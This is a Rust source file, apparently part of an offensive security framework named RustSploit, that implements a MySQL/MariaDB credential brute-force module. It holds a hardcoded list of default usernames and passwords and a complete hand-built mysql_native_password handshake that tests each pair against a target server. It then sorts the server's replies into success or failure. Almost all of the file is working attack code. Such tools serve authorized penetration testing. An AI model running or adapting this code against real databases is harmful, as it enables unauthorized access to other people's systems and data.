//! MySQL credential brute-force.
//!
//! Single-target probe. The scheduler handles fan-out. This module speaks
//! enough of the MySQL handshake / `mysql_native_password` auth flow to
//! distinguish "valid creds" from "wrong creds" without pulling in a
//! full MySQL client.

use anyhow::{Context, Result};
use crate::module::{ModuleCtx, ModuleOutcome};
use std::time::Duration;

use crate::module_info::{ModuleInfo, ModuleRank};
use crate::utils::creds_helper::{self, CredsRun};
use crate::utils::LoginResult;

const DEFAULT_MYSQL_PORT: u16 = 3306;

const DEFAULT_MYSQL_CREDS: &[(&str, &str)] = &[
    ("root", ""),
    ("root", "root"),
    ("root", "password"),
    ("root", "mysql"),
    ("root", "admin"),
    ("admin", "admin"),
    ("admin", "password"),
    ("mysql", "mysql"),
    ("user", "user"),
];

pub fn info() -> ModuleInfo {
    ModuleInfo {
        name: "MySQL Bruteforce".to_string(),
        description:
            "Tests MySQL/MariaDB authentication via the HandshakeV10 → \
             HandshakeResponse41 (mysql_native_password) flow. Reads the \
             OK/ERR packet to classify the result. Single-target — \
             scheduler does fan-out."
                .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![
            "https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_connection_phase.html"
                .to_string(),
        ],
        disclosure_date: None,
        rank: ModuleRank::Normal,
        default_port: Some(3306),
    }
}

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx.target.as_single().context("mysql_bruteforce requires a single-host target")?;
    creds_helper::run(
        target,
        CredsRun {
            service_name: "mysql",
            default_port: DEFAULT_MYSQL_PORT,
            source_module: "creds/generic/mysql_bruteforce",
            defaults: DEFAULT_MYSQL_CREDS,
            password_only: false,
        },
        |host: String, port: u16, user: String, pass: String, timeout: std::time::Duration| async move {
            probe(&host, port, &user, &pass, timeout).await
        },
    )
    .await
}

async fn probe(host: &str, port: u16, user: &str, pass: &str, timeout: Duration) -> LoginResult {
    use sha1::{Digest, Sha1};
    use tokio::io::AsyncWriteExt;

    let addr = format!("{}:{}", host, port);
    let mut stream = match crate::utils::creds_helper::connect_with_timeout(&addr, timeout).await {
        Ok(s) => s,
        Err(e) => {
            return LoginResult::Error {
                message: format!("connect: {e}"),
                retryable: true,
            };
        }
    };

    // MySQL packet: 3-byte LE length + 1-byte sequence ID + payload.
    let mut header = [0u8; 4];
    if let Err(e) = crate::utils::creds_helper::read_exact_with_timeout(
        &mut stream,
        &mut header,
        timeout,
    )
    .await
    {
        return LoginResult::Error {
            message: format!("read handshake header: {e}"),
            retryable: true,
        };
    }
    let payload_len =
        u32::from_le_bytes([header[0], header[1], header[2], 0]) as usize;
    let seq_id = header[3];
    if !(20..=4096).contains(&payload_len) {
        return LoginResult::Error {
            message: format!("implausible handshake length {payload_len}"),
            retryable: false,
        };
    }
    let mut payload = vec![0u8; payload_len];
    if let Err(e) = crate::utils::creds_helper::read_exact_with_timeout(
        &mut stream,
        &mut payload,
        timeout,
    )
    .await
    {
        return LoginResult::Error {
            message: format!("read handshake payload: {e}"),
            retryable: true,
        };
    }
    if payload[0] != 0x0a {
        return LoginResult::Error {
            message: format!("protocol version {} != 10", payload[0]),
            retryable: false,
        };
    }

    // Skip server-version (null-terminated string) + 4-byte conn id + 8-byte salt + 1 filler.
    let mut idx = 1;
    while idx < payload.len() && payload[idx] != 0 {
        idx += 1;
    }
    idx += 1; // null
    if idx + 4 + 8 + 1 > payload.len() {
        return LoginResult::Error {
            message: "handshake too short".to_string(),
            retryable: false,
        };
    }
    idx += 4; // connection id
    let salt1 = &payload[idx..idx + 8].to_vec();
    idx += 8 + 1; // salt + filler

    // Optional server capabilities (2 bytes) + charset (1) + status (2) + caps high (2)
    // + auth-plugin-data-len (1) + 10 reserved + salt2.
    if idx + 2 > payload.len() {
        return LoginResult::Error {
            message: "missing capability flags".to_string(),
            retryable: false,
        };
    }
    idx += 2;
    if idx + 1 + 2 + 2 + 1 + 10 < payload.len() {
        idx += 1 + 2 + 2; // charset + status + capabilities high
        let auth_plugin_data_len = payload[idx] as usize;
        idx += 1 + 10;
        let salt2_len = auth_plugin_data_len.saturating_sub(8).max(12);
        if idx + salt2_len > payload.len() {
            return LoginResult::Error {
                message: "salt2 OOB".to_string(),
                retryable: false,
            };
        }
        let mut salt = salt1.clone();
        salt.extend_from_slice(&payload[idx..idx + salt2_len.saturating_sub(1)]);

        // mysql_native_password: SHA1(pass) ⊕ SHA1(salt || SHA1(SHA1(pass))).
        let auth_response = if pass.is_empty() {
            Vec::new()
        } else {
            let pass_hash: [u8; 20] = Sha1::digest(pass.as_bytes()).into();
            let pass_double: [u8; 20] = Sha1::digest(pass_hash).into();
            let mut salted = Vec::with_capacity(salt.len() + 20);
            salted.extend_from_slice(&salt);
            salted.extend_from_slice(&pass_double);
            let salt_hash: [u8; 20] = Sha1::digest(&salted).into();
            pass_hash
                .iter()
                .zip(salt_hash.iter())
                .map(|(a, b)| a ^ b)
                .collect()
        };

        // Build HandshakeResponse41.
        let client_flags: u32 = 0x0001_8205; // PROTOCOL_41 | SECURE_CONNECTION | LONG_PASSWORD | LONG_FLAG | TRANSACTIONS | PLUGIN_AUTH
        let max_packet: u32 = 1 << 24;
        let charset: u8 = 0x21; // utf8_general_ci

        let mut response = Vec::new();
        response.extend_from_slice(&client_flags.to_le_bytes());
        response.extend_from_slice(&max_packet.to_le_bytes());
        response.push(charset);
        response.extend_from_slice(&[0u8; 23]); // reserved
        response.extend_from_slice(user.as_bytes());
        response.push(0); // null
        response.push(auth_response.len() as u8);
        response.extend_from_slice(&auth_response);
        response.extend_from_slice(b"mysql_native_password");
        response.push(0);

        let mut packet = Vec::with_capacity(4 + response.len());
        let resp_len = response.len() as u32;
        packet.push((resp_len & 0xff) as u8);
        packet.push(((resp_len >> 8) & 0xff) as u8);
        packet.push(((resp_len >> 16) & 0xff) as u8);
        packet.push(seq_id.wrapping_add(1));
        packet.extend_from_slice(&response);

        if let Err(e) = stream.write_all(&packet).await {
            return LoginResult::Error {
                message: format!("write response: {e}"),
                retryable: true,
            };
        }

        // Read OK / ERR / AuthSwitchRequest.
        let mut h2 = [0u8; 4];
        if let Err(e) = crate::utils::creds_helper::read_exact_with_timeout(
            &mut stream,
            &mut h2,
            timeout,
        )
        .await
        {
            return LoginResult::Error {
                message: format!("read auth result: {e}"),
                retryable: true,
            };
        }
        let p2_len = u32::from_le_bytes([h2[0], h2[1], h2[2], 0]) as usize;
        if !(1..=4096).contains(&p2_len) {
            return LoginResult::Error {
                message: format!("invalid auth-result length {p2_len}"),
                retryable: false,
            };
        }
        let mut p2 = vec![0u8; p2_len];
        if let Err(e) = crate::utils::creds_helper::read_exact_with_timeout(
            &mut stream,
            &mut p2,
            timeout,
        )
        .await
        {
            return LoginResult::Error {
                message: format!("read auth body: {e}"),
                retryable: true,
            };
        }
        match p2[0] {
            0x00 => LoginResult::Success,
            0xff => {
                // ERR packet: marker (1) + error-code (2 LE) + ...
                if p2.len() >= 3 {
                    let err_code = u16::from_le_bytes([p2[1], p2[2]]);
                    match err_code {
                        // Access/auth denials — definitive negatives.
                        // 1044 db-access, 1045 access-denied, 1698 auth-plugin
                        // denied, 1862 password-expired, 1226/1227 resource/priv,
                        // 1130 host-not-privileged.
                        1044 | 1045 | 1130 | 1226 | 1227 | 1698 | 1862 => LoginResult::AuthFailed,
                        _ => {
                            let msg = if p2.len() > 9 {
                                String::from_utf8_lossy(&p2[9..]).to_string()
                            } else {
                                format!("MySQL error {err_code}")
                            };
                            // The server sent an ERR packet, so it DID respond —
                            // not a transient/connection fault. Mark non-retryable
                            // so an unexpected error code doesn't burn retries and
                            // trip the consecutive-error lockout on a live server.
                            LoginResult::Error {
                                message: msg,
                                retryable: false,
                            }
                        }
                    }
                } else {
                    LoginResult::AuthFailed
                }
            }
            0xfe => {
                // AuthSwitchRequest — the server wants a different plugin.
                // Treat as auth fail for now to avoid recursion.
                LoginResult::AuthFailed
            }
            other => LoginResult::Error {
                message: format!("unexpected auth-result marker 0x{other:02x}"),
                retryable: false,
            },
        }
    } else {
        LoginResult::Error {
            message: "incomplete handshake (no auth-plugin data)".to_string(),
            retryable: false,
        }
    }
}

crate::register_native_module!(crate::module::Category::Creds, "generic/mysql_bruteforce", native);
